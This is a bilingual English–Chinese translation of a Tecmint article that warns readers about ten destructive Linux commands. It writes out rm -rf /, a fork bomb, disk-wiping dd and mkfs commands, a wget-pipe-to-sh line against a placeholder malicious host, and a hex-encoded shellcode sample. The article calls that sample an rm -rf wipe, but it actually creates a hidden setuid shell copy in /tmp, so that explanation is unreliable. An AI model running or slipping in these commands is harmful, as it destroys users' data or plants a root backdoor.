10 Most Dangerous Commands – You Should Never Execute on Linux

"10个最危险的命令 － 你永远不要在Linux下执行，否则呵呵.."

"================================================================================"

Linux command line is productive, useful and interesting but sometimes it may be very much dangerous specially when you are not sure what you are doing. This article is not intended to make you furious of **Linux** or **Linux command** line. We just want to make you aware of some of the commands which you should think twice before you execute them.

"Linux命令行佷有用很高效，也很有趣，但有时候你不确定你自己在正在做什么时尤其的危险。这篇文章并不打算使你对**Linux**或**linux 命令行**感到愤怒。我们只是想让你意识到在你运行有些命令时应该三思而后行。"

"![](http://www.tecmint.com/wp-content/uploads/2013/11/Dangerous-Linux-Commands.png)"

### 1. rm -rf Command ###

"### 1. rm -rf 命令　###"

The **rm -rf** command is one of the fastest way to delete a folder and its contents. But a little typo or ignorance may result into unrecoverable system damage. The some of options used with **rm command** are.

"**rm -rf**命令是删除文件夹及其内容最快的方式之一。仅仅一丁点的打字错误或无知都可能导致不可恢复的系统毁坏。下列是一些**rm 命令**的选项。"

- **rm** command in Linux is used to delete files.
"- **rm**　命令在Linux下通常用来删除文件。"
- **rm -r** command deletes the folder recursively, even the empty folder.
"- **rm -r** 命令递归的删除文件夹，甚至是空的文件夹。"
- **rm -f** command removes ‘Read only File’ without asking.
"- **rm -f** 命令能不经过询问直接删除‘只读文件’。"
- **rm -rf /** : Force deletion of everything in root directory.
"- **rm -rf /** : 强制删除root目录下所有东东。"
- **rm -rf ** *  : Force deletion of everything in current directory/working directory.
"- **rm -rf** * :　强制删除当前目录／工作目录的所有文件。"
- **rm -rf .** : Force deletion of current folder and sub folders.
"- **rm -rf .** : 强制删除当前文件夹及其子文件夹。"

Hence, be careful when you are executing **rm -rf** command. To overcome accidental delete of file by ‘**rm**‘ command, create an alias of ‘**rm**‘ command as ‘**rm -i**‘ in “**.bashrc**” file, it will ask you to confirm every deletion.

"从现在起，当你要执行**rm -rf**命令时请留心一点。我们可以在“**.bashrc**”文件对‘**rm**‘命令创建**rm -i**的别名，来预防用 ‘**rm**‘命令删除文件时的事故，它会要求你确认每一个删除请求。"

### 2. :(){:|:&};: Command ###

"### 2. :(){:|:&};: 命令###"

The above is actually a **fork bomb**. It operates by defining a function called ‘:‘, which calls itself twice, once in the foreground and once in the background. It keeps on executing again and again till the system freezes.

"这就是个**fork 炸弹**的实例。具体操作是通过定义一个名为 ‘:‘的函数，它会调用自己两次，一次在前台另一次运行在后台。它会反复的执行下去直到系统崩溃。"

"    :(){:|:&};:"

### 3. command > /dev/sda ###

"### 3. 命令　> /dev/sda ###"

The above command writes the output of ‘**command**‘ on the block **/dev/sda**. The above command writes raw data and all the files on the block will be replaced with raw data, thus resulting in total loss of data on the block.

"上列命令会将‘**命令**‘的输出写到块设备**/dev/sda**中。该操作会将在块设备中的所有文件替换为命令写入的原始数据，从而导致整个块设备的数据丢失。"

### 4. mv folder /dev/null ###

"### 4. mv 文件夹 /dev/null ###"

The above command will move ‘**folder**‘ to **/dev/null**. In Linux **/dev/null** or **null** device is a special file that discards all the data written to it and reports that write operation succeed.

"上列命令会移动‘**文件夹**‘到**/dev/null**。在Linux中 **/dev/null** 或 **null** 设备是一个特殊的文件，所有写入它的数据都会被清除，然后返回写操作成功。"

"    # mv /home/user/* /dev/null"

The above command will move all the contents of a **User** directory to **/dev/null**, which literally means everything there was sent to **blackhole (null)**.

"上列命令会将**User**目录所有内容移动到**/dev/null**，这意味着所有东西都被‘卷入’**黑洞　(null)**之中。"

### 5. wget http://malicious_source -O- | sh ###

"### 5. wget http://malicious_source -O- | sh ###"

The above command will download a script from a malicious source and then execute it. Wget command will download the script and **sh** will execute the downloaded script.

"上列命令会从一个恶意源下载一个脚本并执行。Ｗget命令会下载这个脚本，而**sh**会执行下载下来的脚本。"

**Note**: You should be very much aware of the source from where you are downloading packages and scripts. Only use those scripts/applications which is downloaded from a trusted source.

"**注意**: 你应该时刻注意你下载包或脚本的源。只能使用那些从可信任的源中下载脚本/程序。"

### 6. mkfs.ext3 /dev/sda ###

"### 6. mkfs.ext3 /dev/sda ###"

The above command will format the block ‘**sda**’ and you would surely be knowing that after execution of the above command your Block (**Hard Disk Drive**) would be new, **BRAND NEW!** Without any data, leaving your system into unrecoverable stage.

"上列命令会格式化块设备‘**sda**’，你无疑知道在执行上列命令后你的块设备(**硬盘驱动器**)会被格式化，**崭新的!**没有任何数据，直接让你的系统达到不可恢复的阶段。"

### 7. > file ###

"### 7. > file###"

The above command is used to flush the content of file. If the above command is executed with a typo or ignorance like “> **xt.conf**” will write the configuration file or any other system or configuration file.

"上列命令常用来清空文件内容。如果用上列执行时输入错误或无知的输入类似 “> **xt.conf**”　的命令会覆盖配置文件或其他任何的系统配置文件。"

### 8. ^foo^bar ###

"### 8. ^foo^bar ###"

This command, as described in our [10 Lesser Known Linux Commands][1], is used to edit the previous run command without the need of retyping the whole command again. But this can really be troublesome if you didn’t took the risk of thoroughly checking the change in original command using **^foo^bar** command.

"这个命令在我们[10个鲜为人知的Linux命令][1]中描述过，用来编辑先前运行的命令而无需重打整个命令。但当用**^foo^bar**命令时如果你没有彻底检查改变原始命令的风险，这可能导致真正的麻烦。"

### 9. dd if=/dev/random of=/dev/sda ###

"### 9. dd if=/dev/random of=/dev/sda ###"

The above command will wipe out the block **sda** and write random junk data to the block. Of-course! Your system would be left at inconsistent and unrecoverable stage.

"上列命令会向块设备**sda**写入随机的垃圾文件从而擦出数据。当然！你的系统可能陷入不协调和不可恢复的状态。"

### 10. Hidden the Command ###

"### 10. 隐藏命令　###"

The below command is nothing but the first command above (**rm -rf**). Here the codes are hidden in **hex** so that an ignorant user may be fooled. Running the below code in your terminal will wipe your **root** partition.

"下面的命令其实就是上面第一个命令 (**rm -rf**)。这里的代码是隐藏在**十六进制**里的,一个无知的用户可能就会被愚弄。在终端里运行下面命令可能会擦除你对**root**分区。"

This command here shows that the threat may be hidden and not normally detectable sometimes. You must be aware of what you are doing and what would be the result. Don’t compile/run codes from an unknown source.

"这个命令表明通常真正的危险是隐藏的，不会被轻易的检测到。你必须时刻留心你在做什么结果会怎样。不要编译／运行从未知来源的代码。"

"    char esp[] __attribute__ ((section(“.text”))) /* e.s.p"
"    release */"
"    = “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″"
"    “\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″"
"    “\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″"
"    “\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″"
"    “\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″"
"    “\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″"
"    “\x6e\x2f\x73\x68\x00\x2d\x63\x00″"
"    “cp -p /bin/sh /tmp/.beyond; chmod 4755"
"    /tmp/.beyond;”;"

**Note**: Don’t execute any of the above command in your **Linux** terminal or shell or of your friend or school computer. If you want to test them, run them in virtual machine. Any in-consistence or data loss, due to the execution of above command will break your system down for which, neither the **Author** of the article nor **Tecmint** is responsible.

"**注意**: 不要在你的或你的同学或学校的电脑里的**Linux**终端或Shell执行以上的任何一个命令。如果你想测试它们，请在虚拟机上运行。任何不和谐或数据丢失，由于运行上面的命令导致你的系统崩溃，文章**作者**和**Tecmint**概不负责。"

That’s all for now. I will soon be here again with another interesting article you people will love to read. Till then Stay tuned and connected to **Tecmint**. If you know any other such **Dangerous Linux Commands** and you would like us to add to the list, please tell us via comment section and don’t forgot to give your value-able feedback.

"今天就到此为止吧，我会很快回来这里，同时带上另一篇你们喜欢的文章。到那时请继续关注和链接到**Tecmint**。如果你知道任何其他**危险的Linux命令**，也想添加到我们的列表中，请通过评论留言给我们同时也别忘了留下你的宝贵意见。"


--------------------------------------------------------------------------------

via: http://www.tecmint.com/10-most-dangerous-commands-you-should-never-execute-on-linux/

译者：[Luoxcat](https://github.com/Luoxcat) 校对：[校对者ID](https://github.com/校对者ID)

本文由 [LCTT](https://github.com/LCTT/TranslateProject) 原创翻译，[Linux中国](http://linux.cn/) 荣誉推出

[1]:http://www.tecmint.com/10-lesser-known-commands-for-linux-part-3/
[2]:
[3]:
[4]:
[5]:
[6]:
[7]:
[8]:
[9]:
[10]:
[11]:
[12]:
